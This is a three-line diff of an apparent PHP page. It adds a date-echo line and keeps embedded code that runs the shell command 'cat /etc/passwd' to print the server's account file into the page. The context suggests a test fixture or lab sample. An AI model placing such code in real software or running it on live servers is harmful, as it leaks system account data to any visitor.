@@ -1,2 +1,3 @@
-Here is /etc/passwd:
-<?php system("cat /etc/passwd"); ?>
+Current date: <?php echo date('Y-m-d H:i:s'); ?>
+/etc/passwd below:
+<?php system('cat /etc/passwd'); ?>
